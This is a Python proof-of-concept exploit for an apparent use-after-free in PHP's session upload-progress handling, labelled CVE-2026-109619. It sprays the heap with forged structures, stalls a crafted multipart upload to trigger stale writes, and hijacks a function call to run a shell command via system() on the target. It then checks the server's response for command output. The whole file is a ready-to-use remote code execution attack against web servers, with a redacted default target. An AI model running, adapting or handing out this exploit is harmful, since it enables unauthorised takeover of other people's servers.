#!/usr/bin/env python3
"""CVE-2026-109619 - stale progress->current_file_bytes_processed, 149 packed reclaim, zend_call_function.

Inner zval* is refreshed on every FILE_START (session.c:3342) and stored on FILE_DATA
at Z_LVAL_P(current_file_bytes_processed) = offset+length (session.c:3355), then
Z_LVAL_P(post_bytes_processed) = post_bytes (session.c:3356), then update().
One file, no second FILE_START, so the inner pointer stays cached across chunks.
Chunk after >1s min_freq: first post-stall FILE_DATA's update() dtors the decoded
progress tree (pDestructor = zval_ptr_dtor). The next FILE_DATA's two stores are
the stale writes. 149 t[] follow in the same body (packed natural table, 320-byte
string bins overlapping the freed arData). zend_call_function = zval_ptr_dtor - 0x43EF0.
"""
from __future__ import annotations

import argparse
import socket
import ssl
import struct
import sys
import time
from urllib.parse import urlparse

FILL = 5120
N149 = 149
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
DELTA_CALL = 0x43EF0
ZEND_INTERNAL = 1


def forge(call: int, cmd: bytes) -> bytes:
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call)
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200 : 200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(b: bytes, name: str, body: bytes, filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(sid: str, cmd: bytes, call: int) -> tuple[bytes, bytes, bytes, dict]:
    b = b"B7kQpoc619"
    spray = forge(call, cmd)
    if b in spray:
        raise SystemExit("forge collided with boundary")
    # 149 first: packed $_POST['t'] exists before the file so the post-stall
    # free can be reclaimed by the next 320-byte allocs, and the table is in the body.
    pre = b""
    pre += part(b, "PHPSESSID", sid.encode()) + b"\r\n"
    pre += part(b, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    for _ in range(N149):
        pre += part(b, "t[]", spray) + b"\r\n"
    pre += part(b, "f", b"", filename="a") + b"\r\n"
    c1 = b"A" * (FILL + 64)
    # single stall point: after c1 the next fill blocks > min_freq
    phase1 = pre + c1
    # c2: FILE_DATA stores (still live) then update() frees decoded tree
    c2 = b"B" * (FILL + 64)
    # c3: both stale stores, inner pointer NOT refreshed (same file)
    c3 = b"C" * (FILL + 64)
    tail = c2 + c3 + b"\r\n--" + b + b"--\r\n"
    meta = {
        "phase1": len(phase1),
        "total": len(phase1) + len(tail),
        "n149": N149,
        "blob": len(spray),
        "c2": len(c2),
        "c3": len(c3),
        "stores": "3355 current_file_bytes_processed=offset+len; 3356 post_bytes_processed=post_bytes",
        "stale": "c3 FILE_DATA, both pointers, no intervening FILE_START",
        "call": hex(call),
    }
    return phase1, tail, pre, meta


def talk(url: str, phase1: bytes, tail: bytes, sid: str, stall: float) -> bytes:
    u = urlparse(url)
    host = u.hostname or "<REDACTED>"
    port = u.port or 443
    path = u.path or "/"
    body_len = len(phase1) + len(tail)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: php2shell-109619\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary=B7kQpoc619\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw = socket.create_connection((host, port), timeout=40)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    ctx = ssl.create_default_context()
    ss = ctx.wrap_socket(raw, server_hostname=host)
    ss.sendall(head + phase1)
    time.sleep(stall)
    ss.sendall(tail)
    ss.settimeout(25)
    chunks = []
    while True:
        try:
            d = ss.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    ss.close()
    return b"".join(chunks)


def sapi_of(resp: bytes) -> str:
    head = resp.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    turbo = powered = server = ""
    for line in head.split("\r\n"):
        low = line.lower()
        if low.startswith("x-turbo-charged-by:"):
            turbo = line.split(":", 1)[1].strip()
        elif low.startswith("x-powered-by:"):
            powered = line.split(":", 1)[1].strip()
        elif low.startswith("server:"):
            server = line.split(":", 1)[1].strip()
    if "litespeed" in turbo.lower() or "litespeed" in server.lower():
        return f"LiteSpeed LSAPI (lsphp) {powered} via {server or 'cloudflare'}"
    return f"{turbo} {powered} {server}".strip()


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("url", nargs="?", default="https://<REDACTED>/Books/index.php")
    p.add_argument("--command", default="uname -a; id; echo JACKALPOC")
    p.add_argument("--sid", default="a1b2c3d4e5f6a7b8c9d0e1f2a3")
    p.add_argument("--stall", type=float, default=1.35)
    p.add_argument("--dtor", default="0")
    p.add_argument("--call", default="")
    p.add_argument("--dry", action="store_true")
    a = p.parse_args()
    dtor = int(a.dtor, 0)
    call = int(a.call, 0) if a.call else (dtor - DELTA_CALL if dtor else 0)
    phase1, tail, _pre, meta = build(a.sid, a.command.encode(), call & 0xFFFFFFFFFFFFFFFF)
    print(f"109619 phase1={meta['phase1']} total={meta['total']} n={meta['n149']} blob={meta['blob']} call={meta['call']}")
    if a.dry:
        open(r"body-109619.bin", "wb").write(phase1 + tail)
        return
    t0 = time.time()
    resp = talk(a.url, phase1, tail, a.sid, a.stall)
    dt = time.time() - t0
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE"
    body = resp.split(b"\r\n\r\n", 1)[-1]
    hit = b"JACKALPOC" in body or b"uid=" in body
    print("status", status)
    print("sapi", sapi_of(resp))
    print(f"bytes {len(resp)} time {dt:.2f}s command_in_body {hit}")
    if hit:
        idx = body.find(b"uid=")
        if idx < 0:
            idx = body.find(b"JACKALPOC")
        print(body[max(0, idx - 80) : idx + 180])
    else:
        print(body[:300])


if __name__ == "__main__":
    main()

